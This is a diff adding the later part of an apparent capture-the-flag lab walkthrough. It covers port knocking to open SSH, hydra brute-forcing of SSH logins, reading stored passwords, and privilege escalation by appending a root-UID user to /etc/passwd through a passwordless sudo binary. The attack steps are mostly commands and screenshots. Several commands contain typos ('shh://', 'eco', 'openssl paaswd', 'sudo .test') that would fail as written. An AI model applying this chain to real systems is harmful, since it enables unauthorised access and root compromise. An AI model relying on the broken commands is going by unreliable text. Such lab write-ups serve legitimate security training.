@@ -192,3 +192,187 @@ http://192.168.0.114/welcome.php?file=../../../../../../../etc/knockd.conf
 
 I found some ports 7469,8475,9842 ,By knockig the ports at a time we can open ssh port 
 
+
+
+
+
+
+
+
+knock 192.168.0.114 7469 8475 9842
+
+![Screenshot from 2023-01-27 16-17-00](https://user-images.githubusercontent.com/108471951/215266612-b164a860-61bf-4b14-9c0a-c2d9b815dbe0.png)
+
+
+
+
+
+
+nmap -sV -sC -A -p22 192.168.0.114
+
+![Screenshot from 2023-01-27 16-17-13](https://user-images.githubusercontent.com/108471951/215266673-c205a820-9396-4961-9153-e38a9cd271fa.png)
+
+
+now ssh port 22 is open
+
+
+
+
+
+
+### hydra 
+
+
+hydra -L users.txt -P pass.txt shh://192.168.0.114
+
+![Screenshot from 2023-01-27 16-21-06](https://user-images.githubusercontent.com/108471951/215266728-e726331a-61f5-4f28-a3d9-c99b9c380d02.png)
+
+
+I got some login credinatials 
+
+
+
+
+
+
+### ssh login
+
+ssh janitor@192.168.0.114
+
+ls -la
+
+![Screenshot from 2023-01-27 16-24-58](https://user-images.githubusercontent.com/108471951/215266786-d49d9b18-ab52-4bf7-b723-3f5392e51d01.png)
+
+
+I found some secret folder
+
+
+
+
+
+
+### enumuration
+
+
+
+cd .secrets-for-putin/
+
+ls
+
+found some passwords file 
+
+cat passwords-found-on-post-it-notes.txt
+
+
+
+![Screenshot from 2023-01-27 16-26-06](https://user-images.githubusercontent.com/108471951/215266906-ba69a4c2-9a66-4b56-acce-d03482941e02.png)
+
+
+I copied this passwords and pasted in the pass.txt file which i created before
+
+
+
+### hyrda 
+
+again i am doin bruteforce with the passwords which i got now
+
+
+
+
+
+hydra -L users.txt -P pass.txt shh://192.168.0.114
+
+
+![Screenshot from 2023-01-27 16-33-59](https://user-images.githubusercontent.com/108471951/215267052-24c1d16a-1ff8-43b1-8757-f8418eb89d97.png)
+
+
+got one new user credintails 
+
+
+
+
+
+### ssh
+
+
+
+ssh fredf@192.168.0.114
+
+sudo -l 
+
+
+![Screenshot from 2023-01-27 16-35-36](https://user-images.githubusercontent.com/108471951/215267146-8a44da20-a09a-4e90-b963-e7f27c0d67f3.png)
+
+As we can see there is no need of passwd required for root in /opt/devtuff/dist/test/test
+
+so I can create a root user there 
+
+
+
+
+
+
+
+openssl paaswd -1 -salt craw 123456
+
+
+![Screenshot from 2023-01-28 16-05-09](https://user-images.githubusercontent.com/108471951/215267244-d7c907e8-3e6f-438e-8be9-97ca3ce13549.png)
+
+user name craw paswd 123456
+
+
+
+
+
+
+cd //opt/devtuff/dist/test
+
+
+eco 'craw:$1$craw$ldNVG4fm2XzHpzdZzWCqx0:0:0::/root:/bin/bash' >> /tmp/ak
+
+
+sudo .test /tmp/ak /etc/passwd
+
+su craw
+
+
+![Screenshot from 2023-01-28 16-05-31](https://user-images.githubusercontent.com/108471951/215267351-9a8cd713-278a-4196-b2c5-c84922a45c8f.png)
+
+
+
+
+
+
+now we are login as root user with user craw
+
+
+cd /root
+
+ls
+
+cat theflag.txt
+
+
+![Screenshot from 2023-01-28 16-05-39](https://user-images.githubusercontent.com/108471951/215267395-fb4b1525-9a1e-49bc-90ff-fadef1c7bc5a.png)
+
+
+
+
+
+
+
+
+
+Successfully found the flag  
+
+
+![Screenshot from 2023-01-28 16-05-52](https://user-images.githubusercontent.com/108471951/215267402-04c917fb-60d1-4f45-91ef-1dcc57cd22ec.png)
+
+
+
+
+
+@robinpaul
+
+#robinpaul
+
